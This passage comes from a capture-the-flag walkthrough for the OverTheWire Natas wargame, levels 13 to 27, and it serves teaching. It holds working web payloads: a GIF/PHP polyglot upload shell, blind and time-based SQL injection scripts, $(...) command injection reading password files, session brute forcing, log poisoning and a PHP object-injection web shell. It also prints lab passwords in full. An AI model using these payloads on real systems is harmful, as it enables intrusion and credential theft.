  printf '<?php echo file_get_contents("/etc/natas_webpass/natas14"); ?>' >> /tmp/shell13.php
  curl -s -u natas13:<pw> -F 'filename=shell.php' -F 'uploadedfile=@/tmp/shell13.php;type=image/gif' http://natas13.natas.labs.overthewire.org/index.php
  curl -s -u natas13:<pw> http://natas13.natas.labs.overthewire.org/upload/<random>.php
  ```
### Step-by-step discovery and crafting (what the recording shows)
1. **Read the source.** The handler now adds one line before accepting the upload:
   ```
   curl -s -u natas13:<pw> http://natas13.natas.labs.overthewire.org/index-source.html | sed 's/<[^>]*>//g' | tr -d '\n' | grep -o 'exif_imagetype[^)]*)'
   exif_imagetype($_FILES['uploadedfile']['tmp_name'])
   ```
   `exif_imagetype` reads the first bytes of the file and returns an image type constant, or `false` if the magic bytes do not match a known format.
2. **Understand exactly how weak that is.** It checks the **prefix only**, not the whole file, and it does not look at the extension. The six bytes `GIF89a` are the GIF signature, so a file that *starts* with them passes, whatever follows.
3. **Build a polyglot: GIF header + PHP code.**
   ```
   printf 'GIF89a' > /tmp/shell13.php
   printf '<?php echo file_get_contents("/etc/natas_webpass/natas14"); ?>' >> /tmp/shell13.php
   file /tmp/shell13.php
   # /tmp/shell13.php: GIF image data, version 89a, 0 x 0   (or similar)
   ```
   `file` agrees it looks like a GIF, which is exactly what `exif_imagetype` will decide.
4. **Upload with the same `.php` trick as level 12.** The extension still comes from the POST `filename` field:
   ```
   curl -s -u natas13:<pw> -F 'filename=shell.php' -F 'uploadedfile=@/tmp/shell13.php;type=image/gif' http://natas13.natas.labs.overthewire.org/index.php
   ```
   The stored path this run is `upload/up58risls8.php`.
5. **Request the stored file.** PHP ignores the leading GIF bytes (they are output, harmless) and executes the `<?php ... ?>` that follows:
   ```
   curl -s -u natas13:<pw> http://natas13.natas.labs.overthewire.org/upload/up58risls8.php
   ```
6. **Verify.** `curl -u natas14:A0xXu2x9FW8rb8OSQ4ei6n5VBbLUz8h8 http://natas14.natas.labs.overthewire.org/` → HTTP 200.
- **Password for natas14:** `A0xXu2x9FW8rb8OSQ4ei6n5VBbLUz8h8`
- **Verification:** `http://natas14.natas.labs.overthewire.org/` with `natas14:<password>` → HTTP 200.
- **Recording:** `recordings/natas/L13.cast`

## Level 14 → natas15
- **Account:** `natas14`.
- **Goal:** A login form checks a MySQL query; log in as an existing user to get natas15's password.
- **Technique and why it works:** The source builds `SELECT * from users where username="$u" and password="$p"` by string concatenation, so both fields are injectable. Supplying `username=" OR 1=1 -- ` closes the string and appends a tautology; `-- ` comments out the password clause, so the query returns every row and `mysqli_num_rows(...) > 0` is true. The page prints the success message with natas15's password. This is SQL injection via unparameterised input; prepared statements would prevent it.
- **Commands:**
  ```
  curl -s -u natas14:<pw> --data-urlencode 'username=" OR 1=1 -- ' --data-urlencode 'password=x' http://natas14.natas.labs.overthewire.org/
  ```
### Step-by-step discovery and crafting (what the recording shows)
1. **Read the source.** The login handler builds the query by concatenation:
   ```
   curl -s -u natas14:<pw> http://natas14.natas.labs.overthewire.org/index-source.html | sed 's/<[^>]*>//g' | tr -d '\n' | grep -o 'SELECT[^;]*' | head -1
   $query = "SELECT * from users where username=\"".$_POST["username"]."\" and password=\"".$_POST["password"]."\"";
   ```
   Both fields sit inside double quotes, so a `"` in either one closes the string literal.
2. **Plan the injection.** We want a query that is true regardless of the credentials: close the username string, append `OR 1=1`, and comment out the password clause. MySQL's comment syntax is `-- ` (two dashes and a space) or `#`.
   ```
   username = " OR 1=1 -- 
   password = x
   ```
   The resulting SQL is `SELECT * from users where username="" OR 1=1 -- " and password="x"`. Every row matches, so `mysqli_num_rows(...) > 0` is true.
3. **Send it with `--data-urlencode`.** The username contains a quote and spaces, so let curl encode it rather than hand-writing `%22`/`%20`:
   ```
   curl -s -u natas14:<pw> --data-urlencode 'username=" OR 1=1 -- ' --data-urlencode 'password=x' http://natas14.natas.labs.overthewire.org/
   ```
   The response prints the "successful login" message and the natas15 password.
4. **Verify.** `curl -u natas15:GB6USCJYJjwLyYhZUNkE1NwDueiTow6g http://natas15.natas.labs.overthewire.org/` → HTTP 200.
- **Password for natas15:** `GB6USCJYJjwLyYhZUNkE1NwDueiTow6g`
- **Verification:** `http://natas15.natas.labs.overthewire.org/` with `natas15:<password>` → HTTP 200.
- **Recording:** `recordings/natas/L14.cast`

## Level 15 → natas16
- **Account:** `natas15`.
- **Goal:** A username form runs `SELECT * from users where username="$u"`, and the only feedback is whether a user exists ("This user exists" / "This user doesn't exist"). There is no password output, so this is blind SQL injection.
- **Technique and why it works:** The username is concatenated into the query, so we can append conditions. `username=natas16" AND password LIKE "%` returns "exists", proving the user `natas16` exists and that we can test predicates on its password. To read the password without a visible value, we test one character position at a time with a binary search: `AND ORD(SUBSTR(password,<pos>,1)) > <mid>`. The "exists" / "doesn't exist" response is the one-bit oracle; each step halves the character range (ASCII 32–126), so ~7 requests per character recover it. The script below extracts all 32 characters and prints the password.
- **Commands:**
  ```
  curl -s -u natas15:<pw> --data-urlencode 'username=natas16" AND password LIKE "%' http://natas15.natas.labs.overthewire.org/
  # python: binary search on ORD(SUBSTR(password,pos,1)) over ASCII 32..126
  ```
### Step-by-step discovery and crafting (what the recording shows)
1. **Read the source.** The query only takes a username, and the output is a fixed message either way:
   ```
   curl -s -u natas15:<pw> http://natas15.natas.labs.overthewire.org/index-source.html | sed 's/&nbsp;/ /g; s/<[^>]*>//g' | tr -d '\n' | grep -o 'SELECT [^;]*;' | head -1
   $query = "SELECT * from users where username=\"".$_POST["username"]."\"";
   # if(mysqli_num_rows($res) > 0) print "This user exists.<br>"; else print "This user doesn't exist.<br>";
   ```
   There is no password echo, so the response is a one-bit oracle: exists / doesn't exist.
2. **Confirm we can test predicates on the password.** Append a condition after closing the username string:
   ```
   curl -s -u natas15:<pw> --data-urlencode 'username=natas16" AND password LIKE "%' http://natas15.natas.labs.overthewire.org/ | grep -i "exists"
   # This user exists.
   ```
   This proves the row `natas16` exists and that our `AND` clause is being evaluated against its password.
3. **Turn it into a character-by-character extraction.** `SUBSTR(password,pos,1)` isolates one character; `ORD()` turns it into a number; a comparison gives the oracle:
   ```
   natas16" AND ORD(SUBSTR(password,<pos>,1)) > <mid> -- 
   ```
   Binary search over ASCII 32..126 needs about 7 requests per character, instead of up to 95.
4. **Drive it from Python.** The recording uses `urllib` with the Basic auth header built by hand, because the loop makes dozens of requests:
   ```
   python3 - <<'PY'
   import urllib.request, urllib.parse, base64
   url = 'http://natas15.natas.labs.overthewire.org/'
   auth = 'Basic ' + base64.b64encode(b'natas15:GB6USCJYJjwLyYhZUNkE1NwDueiTow6g').decode()
   def exists(p):
       d = urllib.parse.urlencode({'username': p}).encode()
       r = urllib.request.Request(url, data=d, headers={'Authorization': auth})
       return b'This user exists' in urllib.request.urlopen(r, timeout=15).read()
   out = ''
   for pos in range(1, 33):
       lo, hi = 32, 126
       while lo < hi:
           mid = (lo + hi) // 2
           if exists(f'natas16" AND ORD(SUBSTR(password,{pos},1)) > {mid} -- '):
               lo = mid + 1
           else:
               hi = mid
       if lo == 32: break
       out += chr(lo); print(out, flush=True)
   print('FINAL', out)
   PY
   ```
   The script prints the password as it grows, so a failure at any position is visible immediately. (The `if lo == 32: break` stops when the next position is NUL/space — i.e. past the end of the password.)
5. **Recovered password:** `Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb`.
6. **Verify.** `curl -u natas16:Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb http://natas16.natas.labs.overthewire.org/` → HTTP 200.
- **Password for natas16:** `Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb`
- **Verification:** `http://natas16.natas.labs.overthewire.org/` with `natas16:<password>` → HTTP 200.
- **Recording:** `recordings/natas/L15.cast`

## Level 16 → natas17
- **Account:** `natas16`.
- **Goal:** The search box runs `passthru("grep -i \"$key\" dictionary.txt")`. This time `;`, `|`, `&`, backtick, single quote, and double quote are filtered — but the value is inside *double quotes*, so `$(...)` command substitution still runs.
- **Technique and why it works:** We inject `$(grep <pattern> /etc/natas_webpass/natas17)`. The shell substitutes the output of that grep into the argument of the outer `grep`, so the outer grep searches the dictionary for the *result*. If the inner grep matches, it prints the natas17 password, which is unlikely to appear in dictionary.txt — so the outer grep outputs nothing. If the inner grep does not match, it prints nothing, the outer grep is run with an empty pattern, and it dumps the whole dictionary (a large response, ~460 KB). That gives a yes/no oracle: empty output means the pattern matched. Using bracket classes (which need no quotes) we binary-search each character with `grep ^<prefix>[<range>] /etc/natas_webpass/natas17`, recovering the full password with ~6–7 requests per character.
- **Commands:**
  ```
  curl -s -u natas16:<pw> --data-urlencode 'needle=$(grep ^[A-M] /etc/natas_webpass/natas17)' http://natas16.natas.labs.overthewire.org/
  # empty <pre> output => prefix matches; full dictionary dump => no match
  # python: binary search over [0-9A-Za-z] for each position (script in the recording)
  ```
### Step-by-step discovery and crafting (what the recording shows)
1. **Read the source and the filter.** The level shows the exact blacklist:
   ```
   curl -s -u natas16:<pw> http://natas16.natas.labs.overthewire.org/index-source.html | sed 's/&nbsp;/ /g; s/<[^>]*>//g; s/&lt;/</g; s/&gt;/>/g' | tr -d '\n' | grep -o 'preg_match([^)]*)'
   preg_match('/[;|&`\'"]/', $key)
   ```
   The value is still interpolated inside **double quotes**: `passthru("grep -i \"$key\" dictionary.txt")`. Inside double quotes, `$(...)` command substitution is still performed by the shell, and `$`, `(`, `)` are not on the blacklist.
2. **Design a boolean oracle.** Inject a command substitution whose *output* becomes the pattern for the outer grep:
   ```
   $(grep ^<prefix> /etc/natas_webpass/natas17)
   ```
   - If the inner grep matches, its output (the password) is substituted into the outer grep's argument. The password is not a word in `dictionary.txt`, so the outer grep prints **nothing**.
   - If the inner grep does not match, the substitution is empty, the outer grep runs with an empty pattern, and it dumps the **whole dictionary** (hundreds of KB).
3. **Confirm the oracle with one fixed character.**
   ```
   curl -s -u natas16:<pw> --data-urlencode 'needle=$(grep ^X /etc/natas_webpass/natas17)' ... | wc -c   # small
   curl -s -u natas16:<pw> --data-urlencode 'needle=$(grep ^Z /etc/natas_webpass/natas17)' ... | wc -c   # huge
   ```
   The recording prints both sizes, which makes the difference unmistakable.
4. **Binary-search the alphabet per position.** Use a bracket class, which needs no quotes and is not filtered: `grep ^<known prefix>[<range>] /etc/natas_webpass/natas17`. The Python driver splits the candidate alphabet `[0-9A-Za-z]` in half each step:
   ```
   python3 - <<'PY'
   # (script in the recording)
   # empty(f'$(grep ^{prefix}[{CHARS[lo:mid+1]}] /etc/natas_webpass/natas17)')
   #   -> True means the next character lies in the low half
   # then confirm the single character and append it; stop when '^<prefix>$' matches
   PY
   ```
   It also checks `^<prefix>$` after each character, which detects the end of the password without assuming a length.
5. **Recovered password:** `KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx`.
6. **Verify.** `curl -u natas17:KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx http://natas17.natas.labs.overthewire.org/` → HTTP 200.
- **Password for natas17:** `KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx`
- **Verification:** `http://natas17.natas.labs.overthewire.org/` with `natas17:<password>` → HTTP 200.
- **Recording:** `recordings/natas/L16.cast`


## Level 17 → natas18
- **Account:** `natas17`, password `KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx`.
- **Goal:** The page runs `SELECT * from users where username="".$_REQUEST["username"].""`. All output about whether the user exists is commented out, so the response never changes — a **blind** SQL injection. The `users` table holds a row `username="natas18"` whose `password` is the next password.
- **Technique and why it works:** blind SQL injection through **time delays**. We inject `" OR IF(<condition>,SLEEP(5),0)-- -`. The `OR` is essential: the username lookup fails, but the `OR` branch still evaluates, and because the query matches several rows, `SLEEP(5)` runs once per row — a true condition takes about 20 s while a false one returns in under a second. That timing difference is our yes/no oracle. For each character position we binary-search `ORD(SUBSTR(password,pos,1))` between 32 and 127, asking whether the code is `>= mid`; the delay answers each question. The password length (32) is found the same way with `LENGTH(password)`.

### Step-by-step discovery and crafting (what the recording shows)
1. **Read the source.** `curl -u natas17:<pw> .../index-source.html` shows the query with double quotes and the commented-out existence messages.
2. **Confirm the injection and the oracle.**
   ```
   curl -u natas17:<pw> --data-urlencode 'username=x" OR IF(1=1,SLEEP(5),0)-- -'   # ~20 s
   curl -u natas17:<pw> --data-urlencode 'username=x" OR IF(1=2,SLEEP(5),0)-- -'   # <1 s
   ```
   The delay is per matched row, which is why the true case is ~20 s rather than 5 s.
3. **Find the length.**
   ```
   ... IF((SELECT LENGTH(password) FROM users WHERE username="natas18")=32,SLEEP(5),0)-- -
   # ~20 s -> the password is 32 characters
   ```
4. **Binary-search each character.** For position `pos`, ask whether
   `(SELECT ORD(SUBSTR(password,pos,1)) FROM users WHERE username="natas18") >= mid`;
   a true answer (delay) moves the lower bound up, a false one moves the upper
   bound down. This needs ~7 requests per character.
   ```
   python3 - <<'PY'
   # (script in the recording: timed() measures curl; cond() = timed > 8 s)
   # for pos in 1..32: binary search lo/hi in [32,127] with ORD(...) >= mid
   PY
   ```
5. **Recovered password:** `fDGn2A6Gsc0BUp3bZw0RNXpg0PZt40op`.
6. **Verify.**
   ```
   curl -s -o /dev/null -w '%{http_code}\n' -u natas18:fDGn2A6Gsc0BUp3bZw0RNXpg0PZt40op http://natas18.natas.labs.overthewire.org/
   # 200
   ```
- **Password for natas18:** `fDGn2A6Gsc0BUp3bZw0RNXpg0PZt40op`
- **Verification:** `http://natas18.natas.labs.overthewire.org/` with `natas18:<password>` → HTTP 200.
- **Recording:** `recordings/natas/L17.cast`

## Level 18 → natas19
- **Account:** `natas18`, password `fDGn2A6Gsc0BUp3bZw0RNXpg0PZt40op`.
- **Goal:** A login form creates a session with `session_id(rand(1,640))` and stores `$_SESSION["admin"] = isValidAdminLogin()`. The direct `admin` login is disabled, and credentials are printed only when the session's `admin` flag is 1.
- **Technique and why it works:** the session identifier is a random number in a small range (1..640) and the server keeps the session state. So we **brute-force the PHPSESSID cookie** from 1 to 640: exactly one of those IDs belongs to an existing session with `admin=1` (the pre-seeded admin session). When we hit it, the server loads that session and `print_credentials()` reveals the next password. The weakness is the tiny, guessable session-ID space.

### Step-by-step discovery and crafting (what the recording shows)
1. **Read the source.** `index-source.html` shows `$maxid = 640`, `session_id(createID(...))` with `createID` returning `rand(1,$maxid)`, and `print_credentials()` gated on `$_SESSION["admin"] == 1`.
2. **Brute-force the cookie.**
   ```
   for sid in 1..640:
       GET / with Cookie: PHPSESSID=<sid>
       if "You are an admin" in response: print the <pre> block
   ```
   ```
   FOUND sid 119
   Username: natas19
   Password: qvwtMqAcVSBlf7HE3sw9pljhqqPF9MMT
   ```
3. **Verify.** `curl -u natas19:<pw> http://natas19.natas.labs.overthewire.org/` → HTTP 200.
- **Password for natas19:** `qvwtMqAcVSBlf7HE3sw9pljhqqPF9MMT`
- **Verification:** `http://natas19.natas.labs.overthewire.org/` with `natas19:<password>` → HTTP 200.
- **Recording:** `recordings/natas/L18.cast`

## Level 19 → natas20
- **Account:** `natas19`, password `qvwtMqAcVSBlf7HE3sw9pljhqqPF9MMT`.
- **Goal:** Same session scheme as level 18, but "session IDs are no longer sequential". The source reveals the format: `$idstr = "$idnum-$user"; return bin2hex($idstr);` with `$idnum = rand(1, $maxid)` and `$maxid = 640`.
- **Technique and why it works:** the session ID is the **hex encoding** of `"<number>-<username>"`. So the admin session's ID is `bin2hex("<n>-admin")` for some `n` in 1..640. We brute-force that predictable structure: for each `n`, send `PHPSESSID=<hex(n + "-admin")>`. When we hit the admin session, the server loads it and prints the credentials. The weakness is again a tiny, deterministic session-ID space — hex-encoding does not add entropy.

### Step-by-step discovery and crafting (what the recording shows)
1. **Read the source.** `createID` shows `$idstr = "$idnum-$user"; return bin2hex($idstr);` and `$maxid = 640`.
2. **Brute-force the encoded ID.**
   ```
   for n in 1..640:
       sid = hex(str(n) + "-admin")
       GET / with Cookie: PHPSESSID=<sid>
       if "You are an admin": print the <pre> block
   ```
   ```
   FOUND n 281 sid 3238312d61646d696e   # hex of "281-admin"
   Username: natas20
   Password: slOKYGsjlJhaqKliGvrgWAzln0JyrWao
   ```
3. **Verify.** `curl -u natas20:<pw> http://natas20.natas.labs.overthewire.org/` → HTTP 200.
- **Password for natas20:** `slOKYGsjlJhaqKliGvrgWAzln0JyrWao`
- **Verification:** `http://natas20.natas.labs.overthewire.org/` with `natas20:<password>` → HTTP 200.
- **Recording:** `recordings/natas/L19.cast`

## Level 20 → natas21
- **Account:** `natas20`, password `slOKYGsjlJhaqKliGvrgWAzln0JyrWao`.
- **Goal:** The level uses a custom session save handler. `mywrite` serialises `$_SESSION` as one `key value` per line (`"$key $value\n"`), and `myread` rebuilds `$_SESSION` by splitting each line on the first space. Credentials are printed when `$_SESSION["admin"] == 1`.
- **Technique and why it works:** **session-file injection**. The `name` parameter is stored into `$_SESSION["name"]`, and the write handler appends it verbatim as a line. If we send a name containing a newline followed by `admin 1`, the session file ends up with a separate line `admin 1`. On the *next* request the read handler parses that line as `$_SESSION["admin"] = 1`, so we are treated as admin. The handler does not escape newlines, so the "value" of one key becomes new keys.

### Step-by-step discovery and crafting (what the recording shows)
1. **Read the source.** `mywrite` builds `"$key $value\n"` lines; `myread` does `explode(" ", $line, 2)` and assigns `$_SESSION[$parts[0]] = $parts[1]`.
2. **Inject a newline.** Send `name = "x\nadmin 1"`. The write handler stores two lines: `name x` and `admin 1`.
3. **Read it back.** The same cookie's session file now contains `admin 1`, so `myread` sets `$_SESSION["admin"] = 1`; `print_credentials()` reveals the password.
   ```
   You are an admin: True
   Username: natas21
   Password: 7meHZ1l2zPoK2v1qfTUxq4Ydfja4UlmU
   ```
4. **Verify.** `curl -u natas21:<pw> http://natas21.natas.labs.overthewire.org/` → HTTP 200.
- **Password for natas21:** `7meHZ1l2zPoK2v1qfTUxq4Ydfja4UlmU`
- **Verification:** `http://natas21.natas.labs.overthewire.org/` with `natas21:<password>` → HTTP 200.
- **Recording:** `recordings/natas/L20.cast`

## Level 21 → natas22
- **Account:** `natas21`, password `7meHZ1l2zPoK2v1qfTUxq4Ydfja4UlmU`.
- **Goal:** The main page starts a session and prints credentials when `$_SESSION["admin"] == 1`. It is colocated with `natas21-experimenter.natas.labs.overthewire.org`, which shares the same session store.
- **Technique and why it works:** **shared-session privilege injection**. The experimenter page copies every request parameter into the session: `foreach($_REQUEST as $key => $val) { $_SESSION[$key] = $val; }`. Because both hosts use the same PHP session storage, we POST `admin=1` to the experimenter, which writes `admin=1` into the shared session. Then we load the main page with the *same* `PHPSESSID` and it reads `admin=1` from the shared session.

### Step-by-step discovery and crafting (what the recording shows)
1. **Read both sources.** The main page checks `$_SESSION["admin"]`; the experimenter sets `$_SESSION[$key] = $val` for every request key on `submit`.
2. **Inject via the experimenter.** POST `submit=1&admin=1&...` to the experimenter; it returns `Set-Cookie: PHPSESSID=<sid>`.
3. **Reuse the session on the main host.** GET the main page with `Cookie: PHPSESSID=<sid>`; the session now has `admin=1`:
   ```
   admin: True
   Username: natas22
   Password: 964laB0r7TuDqJj5b3HFtwsQoc0GhjBF
   ```
4. **Verify.** `curl -u natas22:<pw> http://natas22.natas.labs.overthewire.org/` → HTTP 200.
- **Password for natas22:** `964laB0r7TuDqJj5b3HFtwsQoc0GhjBF`
- **Verification:** `http://natas22.natas.labs.overthewire.org/` with `natas22:<password>` → HTTP 200.
- **Recording:** `recordings/natas/L21.cast`

## Level 22 → natas23
- **Account:** `natas22`, password `964laB0r7TuDqJj5b3HFtwsQoc0GhjBF`.
- **Goal:** The source shows `if(array_key_exists("revelio", $_GET))` prints the credentials. There is no authentication check around it.
- **Technique and why it works:** the credentials are gated only on the *presence* of a GET parameter named `revelio`. There is no login check and no admin session test — a client-supplied parameter alone unlocks the output. Adding `?revelio` to the URL is enough.

### Step-by-step discovery and crafting (what the recording shows)
1. **Read the source.** `index-source.html` shows the `revelio` check with no auth around it.
2. **Send the parameter.**
   ```
   curl -u natas22:<pw> 'http://natas22.natas.labs.overthewire.org/?revelio'
   # You are an admin. ...
   # Password: CH1OBxJy8uAxMM15Nx6VXSMwcJbBbnS5
   ```
3. **Verify.** `curl -u natas23:<pw> http://natas23.natas.labs.overthewire.org/` → HTTP 200.
- **Password for natas23:** `CH1OBxJy8uAxMM15Nx6VXSMwcJbBbnS5`
- **Verification:** `http://natas23.natas.labs.overthewire.org/` with `natas23:<password>` → HTTP 200.
- **Recording:** `recordings/natas/L22.cast`

## Level 23 → natas24
- **Account:** `natas23`, password `CH1OBxJy8uAxMM15Nx6VXSMwcJbBbnS5`.
- **Goal:** The page accepts a password in `?passwd=` and prints the credentials when `strstr($_REQUEST["passwd"],"iloveyou") && ($_REQUEST["passwd"] > 10)`.
- **Technique and why it works:** **PHP loose comparison / numeric-prefix parsing**. Two conditions must hold at once: the string must *contain* `iloveyou` (a substring test), and the same string must compare *greater than 10* as a number. When PHP compares a string with an integer in this style, it converts the string to a number by reading its leading numeric prefix and ignoring the rest. So `"10111iloveyou"` becomes `10111` — greater than 10 — while still containing `iloveyou`. The inverse order `"iloveyou10111"` has no leading digits, converts to `0`, and fails the numeric test. The level is a lesson in type juggling: one value can satisfy a string test and a numeric test at the same time if it is crafted so each check looks at a different part of it.

### Step-by-step discovery and crafting (what the recording shows)
1. **Read the source.** `index-source.html` shows the two-part check. `strstr` needs the literal substring; the `>` comparison is a loose numeric comparison.
2. **Reason about the conversion.** PHP takes the leading digits as the numeric value, so put the number *first* and the magic word after it.
3. **Try the three candidates.**
   ```
   curl -s -u natas23:<pw> 'http://natas23.natas.labs.overthewire.org/?passwd=iloveyou'
   # Wrong!            (contains the word, but converts to 0)
   curl -s -u natas23:<pw> 'http://natas23.natas.labs.overthewire.org/?passwd=10111iloveyou'
   # The credentials for the next level are: ... Password: shlL4BvOtawNCd81dwdKRHFzmTEjYYQX
   curl -s -u natas23:<pw> 'http://natas23.natas.labs.overthewire.org/?passwd=iloveyou10111'
   # Wrong!            (no leading digits -> 0)
   ```
   The recording shows all three responses side by side, which makes the rule visible.
4. **Verify.** `curl -u natas24:<pw> http://natas24.natas.labs.overthewire.org/` → HTTP 200.
- **Password for natas24:** `shlL4BvOtawNCd81dwdKRHFzmTEjYYQX`
- **Verification:** `http://natas24.natas.labs.overthewire.org/` with `natas24:<password>` → HTTP 200.
- **Recording:** `recordings/natas/L23.cast`

## Level 24 → natas25
- **Account:** `natas24`, password `shlL4BvOtawNCd81dwdKRHFzmTEjYYQX`.
- **Goal:** The page prints the credentials when `!strcmp($_REQUEST["passwd"],"<censored>")` is true — the classic "correct password" idiom.
- **Technique and why it works:** **type confusion into `strcmp`**. `strcmp` expects two strings. PHP's `$_REQUEST` can deliver an *array* when the parameter is written `passwd[]=x`. Calling `strcmp` with an array raises a warning ("expects parameter 1 to be string, array given") and returns `NULL` instead of an integer. `!NULL` is `true`, so the condition passes — the password is never compared at all. Crucially PHP does not abort on that warning, so execution continues into the success branch. The level teaches that type checks must be explicit: `is_string()` before `strcmp`, or a strict comparison against a known hash.

### Step-by-step discovery and crafting (what the recording shows)
1. **Read the source.** `index-source.html` shows `if(!strcmp($_REQUEST["passwd"],"<censored>"))`.
2. **Try the normal case.** `?passwd=x` → `Wrong!` (a real string comparison, non-zero result).
3. **Send an array instead.** `?passwd[]=x` makes `$_REQUEST["passwd"]` an array:
   ```
   curl -s -u natas24:<pw> 'http://natas24.natas.labs.overthewire.org/?passwd[]=x'
   # Warning: strcmp() expects parameter 1 to be string, array given ...
   # The credentials for the next level are: ... Password: UJEF5OAHF1eW3lqkpdCDM7ow4syzh4oo
   ```
   The warning is visible in the response — it is the proof that the argument was an array, and the credentials appear in the same response.
4. **Verify.** `curl -u natas25:<pw> http://natas25.natas.labs.overthewire.org/` → HTTP 200.
- **Password for natas25:** `UJEF5OAHF1eW3lqkpdCDM7ow4syzh4oo`
- **Verification:** `http://natas25.natas.labs.overthewire.org/` with `natas25:<password>` → HTTP 200.
- **Recording:** `recordings/natas/L24.cast`

## Level 25 → natas26
- **Account:** `natas25`, password `UJEF5OAHF1eW3lqkpdCDM7ow4syzh4oo`.
- **Goal:** The page includes a language file chosen by `?lang=`. `safeinclude()` blocks `natas_webpass` and strips `../`; `logRequest()` writes our `User-Agent` into `logs/natas25_<PHPSESSID>.log` inside the web root.
- **Technique and why it works:** **log poisoning plus a non-recursive traversal filter**. Two flaws chain:
  1. `logRequest()` writes attacker-controlled data (the `User-Agent` header) into a `.log` file that lives under the web root and is served/included as PHP. So we can write PHP code into it.
  2. The traversal filter is `if(strstr($filename,"../")) { $filename = str_replace("../","",$filename); }`. `str_replace` is a *single* pass: on `....//logs/...` it removes the `../` at offset 2 and leaves `../logs/...` — traversal survives. The `natas_webpass` check then never sees that string, because the file we include is our log.

  We trigger the log write with a deliberate traversal (`lang=../x`), which calls `logRequest()`, and put PHP code in the `User-Agent`. Then we include our own log file: `lang=....//logs/natas25_<sid>.log`. PHP executes the code inside the log.

### Step-by-step discovery and crafting (what the recording shows)
1. **Read the source.** `safeinclude()` shows the `str_replace("../","",...)` strip and the `natas_webpass` block; `logRequest()` shows the exact log path and that the UA is written verbatim.
2. **Start a session and note the id.**
   ```
   curl -s -c /tmp/n25.jar -u natas25:<pw> http://natas25.natas.labs.overthewire.org/
   awk '/PHPSESSID/{print $7}' /tmp/n25.jar     # PHPSESSID=9h17ef548pbk7dgokpcrnmqshs
   ```
   The session id is needed because the log file name contains it.
3. **Write PHP into the log.** Send `lang=../x` (a traversal, so `logRequest` fires) with the code in `-A`:
   ```
   curl -s -b /tmp/n25.jar -u natas25:<pw>         -A '<?php var_dump(file_get_contents("/etc/natas_webpass/natas26")); ?>'         --get --data-urlencode 'lang=../x' http://natas25.natas.labs.overthewire.org/
   ```
   The log line becomes: `[date] <?php ... ?> "Directory traversal attempt! fixing request."` — a valid PHP file containing our code.
4. **Include the log with the `....//` bypass.**
   ```
   curl -s -b /tmp/n25.jar -u natas25:<pw>         --get --data-urlencode 'lang=....//logs/natas25_9h17ef548pbk7dgokpcrnmqshs.log'         http://natas25.natas.labs.overthewire.org/
   # [01.11.2026 05::02:36] string(33) "3CApdpjqI4UYPxY8mHQWUdFPGH9BoUTT
   ```
   The `str_replace` removed `../` at offset 2 of `....//`, leaving `../logs/...`: the include resolved to our log, PHP executed the payload, and `var_dump` printed the contents of the natas26 password file.
5. **Verify.** `curl -u natas26:<pw> http://natas26.natas.labs.overthewire.org/` → HTTP 200.
- **Password for natas26:** `3CApdpjqI4UYPxY8mHQWUdFPGH9BoUTT`
- **Verification:** `http://natas26.natas.labs.overthewire.org/` with `natas26:<password>` → HTTP 200.
- **Recording:** `recordings/natas/L25.cast`

## Level 26 → natas27
- **Account:** `natas26`, password `3CApdpjqI4UYPxY8mHQWUdFPGH9BoUTT`.
- **Goal:** The page draws an image from a `drawing` cookie, which is `unserialize(base64_decode(...))`-ed. The source also defines a `Logger` class whose constructor and destructor write to a file named `$logFile`.
- **Technique and why it works:** **PHP object injection**. `drawing` is attacker-controlled serialized data, and `drawFromUserdata()` calls `unserialize()` on it with no class whitelist. PHP will happily rebuild *any* class the application has defined — here `Logger`. Its private properties (`logFile`, `initMsg`, `exitMsg`) are set by the serialized string, and `__destruct()` writes `exitMsg` into `logFile` at the end of the request. So we make `logFile` point at `img/natas26_<PHPSESSID>.php` (a directory the web server serves as PHP) and put `<?php ... ?>` in `exitMsg`. The destructor writes our PHP file; fetching it executes the code and prints the natas27 password.

  The private property names must be serialized with their mangled names: `\x00Logger\x00logFile`, `\x00Logger\x00initMsg`, `\x00Logger\x00exitMsg` (NUL, class name, NUL, property). The `s:N:` length prefixes must be exact, including those NUL bytes.

### Step-by-step discovery and crafting (what the recording shows)
1. **Read the source.** `Logger` has `__construct` (writes `initMsg`), `log()`, and `__destruct` (writes `exitMsg`); `drawFromUserdata()` unserializes the cookie; the image path is `img/natas26_<session_id>.png`.
2. **Start a session** so the image path (and therefore our chosen `logFile` name) is predictable:
   ```
   curl -s -c /tmp/n26.jar -u natas26:<pw> http://natas26.natas.labs.overthewire.org/
   awk '/PHPSESSID/{print $7}' /tmp/n26.jar      # PHPSESSID=u7ekpeu5rdisg2eo8nbpsolcft
   ```
3. **Craft the serialized object** (the recording prints the exact base64):
   ```
   O:6:"Logger":3:{
     s:15:"\x00Logger\x00logFile"; s:42:"img/natas26_<sid>.php";
     s:15:"\x00Logger\x00initMsg"; s:0:"";
     s:15:"\x00Logger\x00exitMsg"; s:62:"<?php echo file_get_contents('/etc/natas_webpass/natas27'); ?>";
   }
   ```
   `initMsg` is empty (we do not want the constructor's text), and the payload is in `exitMsg`, which the *destructor* writes. (Writing it in `initMsg` does not work: the object is rebuilt by `unserialize`, so `__construct` is not called — only `__destruct` runs.)
4. **Trigger deserialization** by sending the cookie together with the draw parameters:
   ```
   curl -s -u natas26:<pw> -H "Cookie: PHPSESSID=<sid>; drawing=<b64>" \
        --get --data-urlencode 'x1=1' --data-urlencode 'y1=1' \
        --data-urlencode 'x2=2' --data-urlencode 'y2=2' \
        http://natas26.natas.labs.overthewire.org/
   ```
   At the end of the request `__destruct()` writes the payload into `img/natas26_<sid>.php`.
5. **Fetch the written file.**
   ```
   curl -s -u natas26:<pw> http://natas26.natas.labs.overthewire.org/img/natas26_<sid>.php
   # mj2mBEPWycXTTg5BXYT7UPXgXHx5hjvV
   ```
6. **Verify.** `curl -u natas27:<pw> http://natas27.natas.labs.overthewire.org/` → HTTP 200.
- **Password for natas27:** `mj2mBEPWycXTTg5BXYT7UPXgXHx5hjvV`
- **Verification:** `http://natas27.natas.labs.overthewire.org/` with `natas27:<password>` → HTTP 200.
- **Recording:** `recordings/natas/L26.cast`

## Level 27 → natas28
- **Account:** `natas27`, password `mj2mBEPWycXTTg5BXYT7UPXgXHx5hjvV`.
